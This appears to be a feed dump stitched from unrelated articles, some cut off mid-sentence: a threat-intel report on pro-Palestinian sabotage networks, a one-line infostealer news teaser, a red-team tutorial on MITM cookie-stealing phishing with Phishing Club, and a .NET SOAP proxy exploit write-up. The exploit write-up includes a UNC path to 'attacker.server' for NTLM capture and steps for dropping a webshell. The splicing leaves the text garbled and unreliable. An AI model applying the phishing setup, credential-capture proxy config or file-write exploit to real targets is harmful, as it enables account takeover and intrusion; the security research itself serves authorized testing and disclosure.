the administrators have posted a call to action against industries in Australia that they perceive to be providing support for the IDF. Specifically, they claim that “all sites and equipment used or owned by Toll Holdings and its parent company, Japan Post, are legitimate targets for anti-genocide action. This includes sabotage, vandalism, blockades, strikes, occupations, and all forms of resistance and disruption. Everything is on the table.”Offshoot: Unity of Fields (United States)Unity of Fields (UoF) describes itself as an “anti-imperialist propaganda front” that reports on the activities of militant pro-Palestinian activists in the US. In this regard, it functions in a similar fashion to AVE “counter-info” outlets, which provide AVEs in a specified geographic area with information pertaining to upcoming protests and demonstrations, claims of responsibility for AVE attacks, guides and instructional material for carrying out attacks, and communiqués from local AVE groups.UoF was almost certainly founded as a Palestine Action franchise in the US: during its initial years of operation, it used the name “Palestine Action US,” was managed by a cell of activists who almost certainly founded the group with insight from Palestine Action UK members, and devoted itself to attacking Elbit facilities in the US using Palestine Action’s standard TTPs.From October 7, 2023, to August 2024, Palestine Action US predominantly conducted vandalism, obstruction, and sabotage against Elbit facilities, particularly in Cambridge, Massachusetts, and Merrimack, New Hampshire. Calla Walsh — almost certainly one of Palestine Action US and UoF’s de facto leaders between October 2023 and July 2025 — was arrested and convicted for her role in a November 20, 2023, Palestine Action US attack on an Elbit facility in Merrimack.In August 2024, following Walsh’s release from prison, Palestine Action US announced its rebranding as “Unity of Fields”, appropriating a concept from the Yemeni Houthi movement. The group subsequently renamed its social media and online messenger accounts, launched a new website dedicated to the group’s communiqués and instructional materials, and claimed the group’s new mission was to establish “a militant propaganda front against the US-NATO-zionist axis of imperialism.” In addition to claims of responsibility for attacks, the website also hosts a repository of instructional and ideological material, as well as publications produced by other AVE groups.Autonomous pro-Palestinian activists across the US have sent several dozen claims of responsibility to UoF for publication claiming responsibility for operations against an array of targets, including defense contractors (including Magellan Aerospace, Rolls-Royce and MTU America, Lockheed Martin, Ghost Robotics Corporation, Leidos, and Israel Chemicals), banks (including Bank of America, Citibank, Wells Fargo, Chase Bank, and BNY Mellon), shipping and logistics companies (including Maersk and Amazon), US military recruitment centers, law enforcement infrastructure (particularly vehicles), university buildings and officials, public transportation, and construction buildings and equipment. Occasionally, DVEs from outside of the US — including other Palestine Action global network groups — send communiqués to UoF for publication. At the time of writing, the most recent claims of responsibility include:An August 7, 2025, communiqué claiming responsibility for an arson of several vehicles at a Lovitt Technologies plant in Melbourne, AustraliaA May 29, 2025, communiqué claiming responsibility for spraypainting several pro-Palestinian messages on a Maersk shipping container in Oakland, CaliforniaA May 9, 2025, communiqué from protesters at the University of Washington that details the occupation of a university buildingUoF has significantly decreased its output of new claims of responsibility since late July 2025, very likely because of internal disputes and a leadership transition within the group. On July 29, 2025, Calla Walsh reported on social media that she was “no longer part of” UoF after a dispute over the “direction in which the project is going,” following which Walsh reported “the organization purged me” and that she had “complied with the decision and transferred them ownership of the accounts.” While Insikt Group is unaware of the exact nature of this dispute, Walsh’s departure from UoF directly followed a July 2025 trip she made to Iran, where she participated in an event hosted by the World Service of the Islamic Republic of Iran Broadcasting (IRIB), Iran’s government-operated media agency. In an October 5, 2025, article on her Substack page, Walsh reported that she had been detained by US Customs and Border Protection (CBP) officers at New York’s John F. Kennedy International Airport following her return from Tehran.Partner: Shut the System (United Kingdom)Unlike other groups included in this report, which are predominantly motivated by the Palestinian cause, Shut the System is a UK-based environmental violent extremist (EVE) group that likely emerged as an offshoot of the UK climate activist group Extinction Rebellion (XR). However, the group has also almost certainly conducted pro-Palestinian direct actions. In addition, Shut the System has also directly collaborated with Palestine Action in the UK, almost certainly due to substantial overlaps between Palestine Action’s and Shut the System’s TTPs, preferred targets, and areas of operation. For instance, Shut the System frequently targets insurers and banks that it claims provide services to major global fossil fuel extraction projects; Palestine Action has also targeted many of the same companies on the grounds that they provide services to the IDF or Israeli government. Both groups also frequently use vandalism with red paint, projectiles, or blunt objects to deface the facade of target properties, as well as sabotage, although Shut the System has very likely deployed more sophisticated methods of infrastructure sabotage than Palestine Action. Overall, Shut the System fits the profile of a Palestine Action partner organization.The first reported Shut the System operation took place in late February 2024. During 2024, the group predominantly conducted vandalism targeting the London offices of insurance companies, such as AIG, Probitas 1492, Chubb, Liberty General, Lloyd’s of London, Markel UK, QBE, Tokio Marine, as well as Barclays, using red paint, graffiti, and projectiles. In a January 2025 communiqué, Shut the System claims to have selected these companies as targets because they were identified in a November 2023 article from Insurance Business Magazine as among the top ten insurers of fossil fuel extraction projects in the world. On June 10, 2024, Shut the System and Palestine Action conducted a joint, UK-wide operation targeting Barclays bank branches in Birmingham, Bristol, Brighton, Edinburgh, Exeter, Glasgow, Lancashire, London, Manchester, Northampton, Sheffield, and Solihull. Activists from both groups sprayed red paint on the exterior of the branch facilities and smashed their windows with projectiles.Subsequently, the group has very likely expanded its targeting aperture to include conservative think tanks, additional financial services providers, and events for defense contractors, posting claims of responsibility for attacks on its websites and social media profiles. Shut the System’s website also contains instructions on how to conduct vandalism, obstruction, and sabotage on behalf of the group, and provides a list of 38 banks and insurance companies that it identifies as priority targets due to their alleged financing of the fossil fuel industry. The group continues to conduct joint operations with a number of UK-based AVE and EVE cells, including cells affiliated with almost certain Palestine Action offshoot groups. For instance, during the past several months, Shut the System claims to have collaborated with pro-Palestinian militant direct action groups during the following operations:On October 8, 2025, Shut the System’s “Palestine solidarity faction” and activists from the UK group Palestine Pulse claimed to have used projectiles and blunt instruments to destroy “entrances, glass panels, security cameras and ID card readers” at a Palantir Technologies facility in London. They additionally claimed to have sprayed red paint on the building’s facade.On September 29, 2025, Shut the System claimed to have conducted a joint operation with Shut Elbit Down and French and German XR affiliate groups to target Barclays and BlackRock assets throughout the UK and Europe. Activists sprayed red paint outside of Barclays offices in Paris, France, and Hamburg, Germany, and a BlackRock office in Vienna, Austria, and “superglued locks of [Barclays] branches across the UK.” Additionally, Shut the System stated it targeted two Barclays senior executives in the UK by spraying red paint outside of their personal residences, and sending letters to the executives’ neighbors “inviting them to a cocktail party hosted by the [executive] where they can explain why they have no conscience.”On September 8, 2025, Shut the System claimed to have severed fiber-optic cables leading to the London offices of Clarion Events, the company responsible for hosting the Defence and Security Equipment International (DSEI) defense trade exhibition. It conducted the action as part of a campaign, “Shut DSEI Down,” that aimed to protest the trade exhibition due to the participation of several defense contractors that pro-Palestinian activists argue provide armaments to the IDF.From January 2025 onward, Shut the System frequently used a physical attack TTP that we have not observed in the operations of other Palestine Action global network groups, namely, sabotaging communications infrastructure by cutting fiber optics lines. Instructions on Shut the System’s website demonstrate how to identify fiber optic cable boxes outside of target facilities, locate the correct wires, and sever them to disrupt internet and other communications services to the building. Between August 18 and September 31, 2025, Shut the System launched a campaign titled “Summer of Sabotage” in which it encourages activists to use these and other sabotage TTPs to target banks and financial industry entities.The decentralized nature of individual Palestine Action cells entails that activists very likely plan operations in closed or encrypted communications channels that are almost certainly inaccessible to individuals who have not established their bona fides with the group. The groups’ official communications announce operations after the fact; they almost certainly will not provide indicators and warnings (I&W) of planned activities.To diminish risks from physical threat activities conducted by Palestine Action’s global network, organizations and their physical security teams should focus on mitigating the effects of attacks by implementing the following approaches. Overall, physical security measures should aim to deny Palestine Action operatives interior access to facilities. The most costly attacks perpetrated by the group — including the June 2025 attack on RAF Brize Norton — took place after activists were able to breach secure perimeters, enter facilities, and sabotage assets stored inside perimeters.Recorded Future customers can leverage the Recorded Future Intelligence Operations Platform to monitor communications sources connected to Palestine Action and its global network, in order to determine evolutions in trends in targeting and TTPs and an organization’s overall risk level.Customers can use the Recorded Future Platform’s Intelligence Cards, Advanced Query Builder, and Insikt Group reporting to track ongoing global events — such as the Israel-Hamas conflict or the status of Palestine Action’s legal battle against its terrorism designation in the UK — that are likely to affect threat actors’ operational tempo and targeting aperture.Integrate this report and other Insikt Group assessments of DVE threat actors’ TTP and targeting into structured tabletop exercises for physical security teams.Review and, where necessary, implement governmental guidelines for physical protection of business facilities, particularly with regard to electronic surveillance, secure lighting, and security personnel.Conduct vulnerability assessments to enable effective contingency and resiliency planning in the event of an incident of vandalism, obstruction, or sabotage, with particular focus on a successful incident disrupting communications, transportation, and energy infrastructure.Limit voluntary publication of information about the functions, layout, and location of critical infrastructure assets at facilities, or security measures at a facility, beyond the levels necessary to comply with legal or regulatory requirements.While Palestine Action’s branch in the UK continues the ongoing legal appeal of its terrorism designation — very likely until the designation is rescinded or all of its legal options are exhausted — Palestine Action’s global network is very likely to escalate the frequency and scope of its militant direct action operations. In the short to medium term, the formation of new Palestine Action global network groups in North America, Western Europe, Australia, and elsewhere around the world is likely, threatening an increased range of organizations in defense contracting, banking, finance, insurance, and shipping and logistics sectors.Extant groups linked to Palestine Action are also likely to traverse the various categories of groups described in this report, with cells inside the UK attempting to separate themselves from the Palestine Action brand to avoid legal scrutiny and cells outside the UK highlighting their connections to Palestine Action to build credibility with AVEs and the pro-Palestine activist movement. As such, we expect existing franchises and affiliates in the UK to increasingly become offshoots and partners while the ban is in effect; the reverse is likely in geographic areas outside the UK where Palestine Action is not a designated terrorist organization.Volatile dynamics in the Israel-Hamas conflict and the situation in the Gaza Strip are also very likely to influence Palestine Action’s global network in the short to medium term, especially with regard to the frequency of attacks. At the time of writing, a ceasefire between Israel and Hamas, effective October 10, 2025, remains in effect. While the establishment of the ceasefire likely did not stop Palestine Action network groups from conducting operations — several of the groups profiled in this report have carried out attacks in the interim — any potential breakdown in the ceasefire would very likely augur increased Israeli military activity in the Gaza Strip that has historically caused upticks in attacks related to the network.]]></content:encoded></item><item><title>Google ads for shared ChatGPT, Grok guides push macOS infostealer malware</title><link>https://www.bleepingcomputer.com/news/security/google-ads-for-shared-chatgpt-grok-guides-push-macos-infostealer-malware/</link><author>Bill Toulas</author><category>security</category><pubDate>Wed, 10 Dec 2025 23:50:56 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A new AMOS infostealer campaign is abusing Google search ads to lure users into Grok and ChatGPT conversations that appear to offer "helpful" instructions but ultimately lead to installing the AMOS info-stealing malware on macOS.

Using the services in the way
				described in this post is highly likely in violation of their
				.
				
				This is strictly and exclusively for professional red teams performing authorized security testing.

				Always ensure you have the proper authorization and do you own ethical and legal
				considerations before performing phishing operations.

				If you do perform phishing simulation for clients, this is NOT things you should do. I will
				write another post, another time, on how to use Phishing Club for phishing simulation, none
				of the methods described in this post is required or should be used for that. Phishing Club
				is suitable for both simulation- and red team phishing testing. This is red team phishing,
				if in doubt, read the post about
				Phishing simulation vs Red team phishing.I will be using Phishing Club to perform red team phishing, where I steal cookies via. a
				MITM phishing campaign and use it to hijack the session.
				To do this I will setup production Phishing Club from scratch on DigitalOcean and hide it behind
				Cloudflare using their Proxy DNS, create and run a recon campaign and a MITM phishing campaign
				with live notifications on my phone. For the campaigns I will create simple emails, landing pages,
				evasion pages and MITM proxying. The campaigns will mostly be benign examples, as I want to showcase
				some of the offensive features of Phishing Club, so this is not a guide on creating a Microsoft
				365 MITM configuration.I hope you enjoy the post, connect with me on
				LinkedIN,
				X
				or join the
				Phishing Club Discord Chat.
				
				All infrastructure used in this post has been removed.Installing on DigitalOceanLets start off by installing Phishing Club on DigitalOcean. Almost any provider will do, so
				there is no special reason or advantage to using DigitalOcean for MITM phishing, I just
				happend to have an account, so it was a lazy choice more than anything else. Any provider
				with sane linux OS options will work. Phishing Club's installer uses ,
				so a distro (such as Debian) that uses it is recommended.Lets start by creating a droplet, which is what DigitalOcean calls a cloud VM / VPS.2 GB / 2 Intel CPUs 90 GB NVMe SSDs 3 TB transfer at $24 per monthYou can select another location, operating system and a lesser instance type, this really
				depends on what you want to do.Consider that when doing MITM phishing, the machine will do an outgoing connection to the
				server that is being proxied. This means that the login, will be performed from that
				location, and not the location the target is on. Most defensive systems also inspect the
				logs and spot unusal login activity such as login from a VPS provider or a unexpected
				location. Phishing Club supports using  proxies with proxy configuration
				to blend in, however I will not cover that in this post.Give the Droplet a worthy hostname and click Because I am going to use Cloudflare DNS proxying, I will be unable to use DigitalOcean's
				own firewall rules to add additional IP access control to the admin web interface. Dont
				worry, if you use a private dedicate IP or private VPN, you can add this to Phishing Clubs
				own configuration, later on.Now I will install  by SSH'ing into the newly created droplet and
				run the one line installer from the
				Phishing Club repository:curl -fsSL https://raw.githubusercontent.com/phishingclub/phishingclub/main/install.sh | bashThis will download the latest version and start a interactive installer. I have choosen the
				following values:This port is used to serving phishing domains and pages via. in TLS terminated setups. I
					will be doing that, but the port has to be set anyway.
				This port is used for serving all phishing domains and pages over HTTPS.This port is used for the administration web interface.This is the domain I will use to host the adminstration interfaceI choosen  because I want to use a self-signed certificate in combination
					with Cloudflare Proxy
				Email for account handling LetsEncrypt and etc, read more at CertMagicI picked  for the administration server, as Cloudflare Proxy only allows a
				few HTTPS ports to be proxied: 
				HTTPS ports supported by Cloudflare 443 2053 2083 2087 2096 8443 
				Ports supported by Cloudflare, but with caching disabled 2052 2053 2082 2083 2086 2087
				2095 2096 8880 8443
				See the list on CloudflareComplete the process by clicking .The installer creates a new user and group for Phishing Club, install it to  and adds a systemd unit boots up, if the server is restarted or etc.Notice that the administrator password is output, but ignore it, because of the setup with
				Cloudflare there is additional configuration required, and a another password will be
				generated later.Many threat actors abuse Cloudflare's proxy functionality to hide their IP, benefit from
				Cloudflare's IP reputation and use their wildcard certificate. I will also do that but
				creating an account and adding domain(s) to it, I will not cover this in this post. Also I
				will only be using a single domain for everything. For a fully realistic and effective
				phishing operation, you will might need to setup multiple.I will setup a configuration, that ensures I have full encryption between my targets and the
				phishing club instance: public certificates handled by Cloudflare, between the targets and
				Cloudflare, and self signed certificates between Cloudflare and our server.Go to  and set  to .Next I setup  for my phishing and admin domain. 
				Add a  record for  (root) 
				Add a  record for  (wildcard).
				The first record ensures, I can place a website on the root of the domain for any curious people
				and bots that are looking to categorize the domain.
				The second record make Cloudflare issue a wildcard certificate for
				. This help aid in opsec, as public certificates, are public
				and automatically investigated by bots from both benign and malicious actors.With the server up and DNS proxying configured for Cloudflare, I am ready to configure and
				setup Phishing Club.Configuring Phishing ClubBecause Phishing Club is proxied behind Cloudflare, I need to do a bit of extra
				configuration. 
				First I must configure trusted proxies. This can not be skipped, because the administration cookies
				are bound to the IP of the connection logging in, and the incoming IP from Cloudflare to my server
				will switch between requests, which will invalidate the session and log me out. Furthermore this
				will ensure that the servers logs the correct IP in the admin audit log.On the server edit /opt/phishingclub/config.json
				under the `ip_security.trust_proxies`, I add all of
				Cloudflare's CIDR's, at the moment that would
				be:"173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18", "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22", "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13", "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22", "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32", "2405:8100::/32", "2a06:98c0::/29", "2c0f:f248::/32"And then I add the header to be trusted for forwarding the clients IP in the ip_security.trusted_ip_header
				by setting it to .I could also add my dedicated IP or private VPN IP to ip_security.admin_allowed, with this configured a visitor not from a allow listed IP, will get a  response
				when visiting the administration website.The configuration changes require a restart of the service to take effect. When restarting
				Phishing Club, before completing the setup of a new admin account, it generates a new random
				password, so after restarting, I must get the password from the logs.root@phishingclub:~# systemctl restart phishingclub.service
root@phishingclub:~# journalctl -u phishingclub.service -n 30 -r
			Then I open the administration website, and login with username  and the password.I then setup a new admin user. Consider using a random username and password of atleast 16
				characters. Phishing Club also supports opting in for MFA or using SSO via. Microsoft.On the next step, I will check Yes, install example templates.Lastly I complete the setup by clicking .Phishing Club is now installed and ready for use.When humans and bots visit our domain , I want real content,
				that matches my domain name and places the domain in the right category.
				In the menu, under , click , add
				
				and enable .Now I can add content to my website for the domain by clicking
				and . This will open the editor, where I can add some AI slop or a
				nicely designed page.Now when a bot or human inspects the website, it will show my nice content. Great!However in many cases, it can be easier and more beneficial to reverse proxy and modify
				another website. So lets delete the domain I setup by clicking ,
				
				and
				 in the delete modal.Instead I will setup a reverse proxy by going to  and clicking
				.
				I will be abusing phishing.club as a
				decoy domain and repurpose it a bit.Warning! Hey watch out! Proxying and modifying page may result in a an abuse complaint or
				worse, consider if AI cant help you out build a page instead.
				In  I will add the name, in , the  will not actually be used as I
				will not be using the root domain in a phishing campaign, but it is required to fill.global:
    tls:
        mode: self-signed
    access:

          from: response_bodyYou can read more about the proxy configuration in the guide but lets go over a some important things.In the global section, which applies too all hosts, I added  this ensures that all domains created from the configuration are setup with self signed certificates.The  ensures that anyone can visit the domains set in the configuration.
				By default access to proxied domains is denied and only allowed after visiting a lure URL.The rest is a mapping between my domain and the proxied domain, along with a couple of
				content rewrite rules.Now when I visit phishing.company, I can see it proxies phishing.club and performs the
				modifications I defined.With this out of the way, lets move on, and look at putting together a recon campaign.Building a recon campaignThe purpose of a recon campaign is to retrieve information from the target. It is a
				excellent way, to find out what IP's the target could be connecting from, what bots are
				scanning or investigating links and etc.To build a recon campaign, I only need to make a email and page the target can visit.For this recon lure, I will start by creating a new subdomain.Instead of hosting content on the  path of the subdomain, I added a redirect to
				the root domain. Just in case someone or something visits the subdomain.Next, I will upload a image to to the subdomain by clicking ,
				download.phishing.company
				and on I uploaded a image of a cute cat, and places it on a random path.Now the image can be access and used by the url on the domainNow lets create a simple page that uses this asset. Go to , click
				 and add the following HTML.<!DOCTYPE html>
<html>
<body>
  <div>
    <img src="{{.BaseURL}}/2025/agivuqty/cat.jpg" width=600 />
  </div>
</body>
</html>
			Click  and lets move on to adding an email. Click  and
				.I will create a very simple email.Hi<br/><br/>
I am sorry to disturb, but have you seen my cat?<br/>
It was last seen around your property and afraid he might still be there.<br/><br/>
Here is a <a href={{.URL}}>image of him</a><br/><br/>As you might noticed, I set the  and  to dummy values.
				This is because I will not be sending this email via. SMTP, instead I will later send it via.
				a email service such as gmail or outlook manually. Phishing Club support delivery via. SMTP,
				API Sender (Customly defined requests), and custom delivery (do it yourself). Diving into SMTP
				and custom API delivery is outside the scope of this post.Eventhough I will not be using a SMTP provider, it is still required for creating a
				template, so I will quickly create a Dummy SMTP template by clicking
				
				and .I will fill it out with dummy values as seen on this image.Now I got everything I need to create a template. A template is a phishing lure with
				configuration that I can reuse across multiple campaigns. I will create one for the recon
				campaign by going to
				
				and clicking
				.For the template I will use the following values:With this out the way, I am ready add some targets. Lets create 2 recipients and add them to
				a group. Click  and .Both recipients will be added to a group named  by clicking
				,
				.Click the newly created group and click , then add both
				recipients.Everything is now setup, so I will now create the recon phishing campaign.Click  and . Name it
				 and select the  template.Add the  to the .Select  scheduling. This ensure I can deliver the lures myself, however
				and whenever I want.In the  section, check
				, with this enabled extra data from a page visit is saved.
				Specificly the JA4 fingerprint, Sec-CH-UA-Platform header and Accept-Language header of the
				visitor. However with the setup where we proxy behind Cloudflare, I will not be able to read
				the JA4, because the JA4 will be that of Cloudflares proxy and not the recipients.In the last step, click  and then click on the campaign in the table afterwards,
				this will open the campaign page.Lets start by delivering the a lure to one of the recipients. Go to the bottom of the
				campaign page and down to the  table. To the right of the
				recipient, click
				, and select . This will copy the email I made
				earlier into the clipboard in rich a format. This makes it easy to paste complex HTML
				directly into other clients or places that support HTML.I created an Outlook email and pasted the email into it, and the clicked Send.The target gets the benign email and clicks the link.Now I have the information I wanted. By sending a couple of these recon mails, I can map out
				likely IP ranges, Geo IP locations, user agents and browser language. I could probably also
				spot if any defensive system visited the link by looking at unusal IP's, user agents or
				other information I do not expect from the target, and use this information in the MITM
				cookie capture campaign later on.On the campaign page, I can keep an eye on the data coming on the campaign event timeline.Go to the bottom of the page, to the  table, and click on the
				recipient we sent the email. This will open a table with the recipients events. I can see that
				the user is on a linux platform, their browser user agent and have the language set to Danish.
				Useful.Lets check if the IP matches a location in our Phishing Club local geo location dataset.
				Expand the menu in the top by clicking the circle and clicking 
				Enter the IP into the .Yes, the IP matches the geo location , I will use this information to create
				an filter for the MITM phishing campaign, so only visitors from a  geo IP sees
				the real phishing page.This concludes the recon campaign. Now I will continue and setup the MITM phishing campaign.Building a MITM cookie phishing campaignFor the campaing, I need to create another email and setup proxy configuration for the MITM
				proxy. But I also want to create an , which will be a "bot be gone"
				page, and a  that will be shown when a visitor fails the evasion page
				or gets caught by the geo IP filter. Before I do this, I want to be realtime notified about
				campaign events on my phone. For this I will setup
				ntfy on the server.SSH to the server and run this code to install :sudo mkdir -p /etc/apt/keyrings
sudo curl -L -o /etc/apt/keyrings/ntfy.gpg https://archive.ntfy.sh/apt/keyring.gpg

				by Robert Lerner. I dont know
				Robert, but I appreciate him creating and hosting this service, which was the most ideal
				page I could find for benign example. Sorry, as mentioned, I wont be adding a M365 proxy
				config here, but sadly enough, at the moment it is quite easy to create, so instead, if you
				need it, download the development setup of Phishing Club and start working on it.I will add the MITM proxy by clicking
				,
				. Add the https://authenticationtest.com/totpChallenge/ and the following config.global:
  tls:
    mode: "self-signed"
authenticationtest.com:
    to: auth.phishing.company
    capture:
        - name: email
          method: POST
          path: /login/
          find: email=([^&]+)

          from: any
          required: true
Note from the future! Capturing can be done much easier now without any regex, see the proxies guideI hope the capturing logic is straight forward to understand. You can read more about
				available proxy configuration rules in the User Guide.Earlier from the recon campaign, I learned that the target traffic originate from a IP I can
				identify as in the DK region. I will create a allow list filter for this. Click 
				and .Under  add , and click save.Next I will create an , which is just a normal page where I can
				place what ever great evasion code I can think off. Malicious actors often make this by
				using Captchas. So I will make a  evasion page.Back on Cloudflare, in the left menu  click
				
				and then Now add a new , use  for the domain, and set
				it is as an invincible challange.After saving it, I will copy the  as I need it in just a bit.Back on Phishing Club, click  and search for , you
				should find the . Under actions, click .Now I will add a bit of content the vistors can watch while they wait for the widget to
				detect that they are human (or not). I also update the widget to use the .<div style="display: flex; width: 100%; height: 100vh; justify-content: center; align-items: center;">
    <h1>Please wait</h1>

As we near the end of 2025, we are, of course, waiting for the next round of SSLVPN exploitation to occur in January (as it did in 2024 and 2025).Weeeeeeeee. Before then, we want to clear the decks and see how much research we can publish.This year at Black Hat Europe, Piotr Bazydlo presented “SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies And WSDL”. This research ultimately led to the identification of new primitives in the .NET Framework that, while Microsoft decided deserved DONOTFIX (repeatedly), were successfully weaponized against enterprise-grade appliances to achieve Remote Code Execution.Affected solutions, including enterprise-grade appliances identified as affected during our extremely light review included:Barracuda Service Center RMM (CVE-2025-34392) - patched in hotfix 2025.1.1.Ivanti Endpoint Manager (EPM) (CVE-2025-13659) - patchedMicrosoft SQL Server Integration ServicesGiven the wide usage of .NET and the limitations of hours in a day, the list of affected products should be considered ‘anecdotal’. There are  a  number of affected vendors and in-house solutions, but bluntly, we believe we’ve made our point above.While today’s blog is designed to provide readers with an overview of our research and its outcomes, further depth can be found inside the whitepaper linked here.To get us all in the right mood - let us show you weaponization of this research against Barracuda Service Center RMM (fixed in hotfix 2025.1.1), now assigned CVE-2025-34392 - preauthenticated, no less.It's a Christmas miracle!HttpWebClientProtocol - Invalid Cast VulnerabilityBack in 2024, we were deep in the SharePoint attack surface (as one does) when we noticed something unusual. In a few places, an attacker could potentially influence the URL that gets passed into a SOAP client proxy.This proxy extended the .NET Framework class System.Web.Services.Protocols.SoapHttpClientProtocol.To explain this further, the .NET Framework provides three different HTTP client proxy types:All of them inherit from the same parent class: .To keep things readable, we focus on , because it is easily the most common and appears across a wide variety of codebases. Its name and the official documentation both paint a simple picture: it should handle SOAP messages transported over HTTP. Straightforward. Predictable. Safe.Reality is less cooperative.namespace MyMath {
    //imports removed for readability

    [System.Web.Services.WebServiceBindingAttribute(Name="MyMathSoap", Namespace="<http://www.contoso.com/>")]
    public class MyMath : System.Web.Services.Protocols.SoapHttpClientProtocol { // [1]

        [System.Diagnostics.DebuggerStepThroughAttribute()]
        public MyMath() { // [2]
            this.Url = "<http://www.contoso.com/math.asmx>"; // [3]
        }

        [System.Diagnostics.DebuggerStepThroughAttribute()]
        [System.Web.Services.Protocols.SoapDocumentMethodAttribute("<http://www.contoso.com/Add>", RequestNamespace="<http://www.contoso.com/>", ResponseNamespace="<http://www.contoso.com/>", Use=System.Web.Services.Description.SoapBindingUse.Literal, ParameterStyle=System.Web.Services.Protocols.SoapParameterStyle.Wrapped)]
        public int Add(int num1, int num2) { // [4]
            object[] results = this.Invoke("Add", new object[] {num1,
                        num2}); 
            return ((int)(results[0]));
        }
        //async calls removed for readability
    }
}
The class sets the target URL of the SOAP service at reference point .It also defines a simple SOAP method named .So how does this behave in practice? You can use this proxy class to send SOAP HTTP requests in a clean and structured way. For example, your application might contain code like this:MyMath math = new MyMath();
math.Add(2, 3);
A SOAP HTTP request is sent to http://www.contoso.com/math.asmx as defined in the  constructor.The SOAP message invokes the  method on the remote service and includes the two integers (2 and 3) as arguments.This makes it a very convenient way to perform SOAP requests in the .NET Framework. There is no need to manually craft a valid SOAP XML body, and these proxy classes appear in many real applications.The same idea applies to the other two proxy types,  and . The only practical difference is that those two send raw HTTP requests rather than SOAP.Now to the important part: how do these proxies handle the URL, and how do they prepare the HTTP request itself? There is a lot of internal plumbing involved.What matters is that the method HttpWebClientProtocol.GetWebRequest is eventually responsible for creating the underlying  object.This is where the fun begins:protected override WebRequest GetWebRequest(Uri uri)
{
    WebRequest webRequest = base.GetWebRequest(uri); // [1]
    //removed for readability
    //...
}
At reference point , the code calls WebClientProtocol.GetWebRequest to obtain the underlying  object.A quick look at that method tells us more:protected virtual WebRequest GetWebRequest(Uri uri)
{
    if (uri == null)
    {
        throw new InvalidOperationException(Res.GetString("WebMissingPath"));
    }
    WebRequest webRequest = WebRequest.Create(uri);
    this.PendingSyncRequest = webRequest;
    webRequest.Timeout = this.timeout;
    webRequest.ConnectionGroupName = this.connectionGroupName;
    webRequest.Credentials = this.Credentials;
    webRequest.PreAuthenticate = this.PreAuthenticate;
    webRequest.CachePolicy = WebClientProtocol.BypassCache;
    return webRequest;
}
We can see that the method uses  to initialize the client, and it does not cast the result to . If you are not deeply familiar with the .NET Framework this might look harmless. In reality it is very interesting. selects the underlying client implementation based on the URL scheme. Three common schemes apply here:If the URL is , the call returns a . If the URL is , it returns a . This is why developers normally cast the result immediately after calling .For example, this is the standard and safe way to create an HTTP client in .NET Framework:HttpWebRequest myReq = (HttpWebRequest) WebRequest.Create(someURL);
That cast is missing in the proxy code. This means the method can return a handler for a protocol that is not HTTP.The child class still attempts to cast the result later, so let us look at the full HttpWebClientProtocol.GetWebRequest method to see what actually happens:protected override WebRequest GetWebRequest(Uri uri)
{
    WebRequest webRequest = base.GetWebRequest(uri); // [1]
    HttpWebRequest httpWebRequest = webRequest as HttpWebRequest; // [2]
    if (httpWebRequest != null) // [3]
    {
        httpWebRequest.UserAgent = this.UserAgent;
        httpWebRequest.AllowAutoRedirect = this.allowAutoRedirect;
        httpWebRequest.AutomaticDecompression = (this.enableDecompression ? DecompressionMethods.GZip : DecompressionMethods.None);
        httpWebRequest.AllowWriteStreamBuffering = true;
        httpWebRequest.SendChunked = false;
        if (this.unsafeAuthenticatedConnectionSharing != httpWebRequest.UnsafeAuthenticatedConnectionSharing)
        {
            httpWebRequest.UnsafeAuthenticatedConnectionSharing = this.unsafeAuthenticatedConnectionSharing;
        }
        if (this.proxy != null)
        {
            httpWebRequest.Proxy = this.proxy;
        }
        if (this.clientCertificates != null && this.clientCertificates.Count > 0)
        {
            httpWebRequest.ClientCertificates.AddRange(this.clientCertificates);
        }
        httpWebRequest.CookieContainer = this.cookieJar;
    }
    return webRequest; // [4]
}
At reference point , the code does attempt to cast the returned  to a . However, it uses the  operator. If the runtime cannot perform the cast, for example when trying to cast a  to , the result is simply .At reference point , the code checks whether  is not . If it is valid, it applies a series of HTTP related settings.At reference point , the method returns the original  object. This is the root cause of the issue. The method creates a new  instance, then immediately discards it, and returns the untouched original request object. It is difficult to imagine that this is the intended behavior. The method should almost certainly return the  instance instead.The .NET Framework HTTP client proxies can be steered into using file system handlers. If we set the URL to something like , the proxy will operate using a  instead of a .Because SOAP requests use the POST method,  will happily write the SOAP request body directly into the file.Wait, what? Why does a SOAP proxy need to be able to “send” SOAP requests to a local file?Nobody on this planet expects to receive a valid SOAP response from the filesystem. One quick look at the official documentation for  confirms what everyone assumes:Represents the base class for all XML Web service client proxies that use the HTTP transport protocol.There is no proud mention of “also works over FTP and FILE, sometimes by accident”.The only condition is: the attacker needs to control the  member of the proxy.So yes, the behaviour is strange and completely unintuitive. The real question is, simply, what we can do with it?How can this weird design choice be turned into a practical security issue?Practical Exploitation #1 - NTLM RelayingSo, what can we do with this?Well, the lowest impact is NTLM relaying or challenge disclosure. If the attacker supplies a UNC path, the SOAP request is written to the attacker-controlled SMB share.file://attacker.server/poc/pocThe application will attempt to write the SOAP body to that path, while an attacker captures the NTLM challenge and attempts to ‘crack it’This is, we guess, still a meaningful outcome for a domain account and depending on the environment, full NTLM relaying may also be possible.That said, this is only the starting point.There are far more interesting ways to abuse this behavior.Practical Exploitation #2 - Arbitrary File WriteIt gets much more interesting, quickly.This behavior can also be used for arbitrary file writes.The strengths of this primitive are clear:The attacker controls the full write path. The proxy can be pointed at any location with any file name or extension.The proxy overwrites existing files, which is useful for replacing scripts or configuration files.If the SOAP method accepts attacker-controlled input, the attacker can write arbitrary strings into the generated XML. This is often enough to drop CSHTML webshells.There are also some limitations:Control over the written content is limited. The output is always a SOAP XML document. Even if the attacker controls a string argument inside that XML, certain characters such as  will always be encoded. This prevents straightforward uploads of ASP or BAT files.Exploitation depends heavily on the application and on whether the attacker can influence the arguments of the SOAP method. If the only available arguments are integers, the attacker cannot meaningfully deliver a payload.In the simple example scenario, the attacker controls both the target URL for proxy called  and a string argument of SOAP method called . They can supply values such as:: file:///Users/Public/a.cshtml: The proxy then writes the file and embeds the attacker-controlled C# code, which can act as a webshell.When  is pointed at a  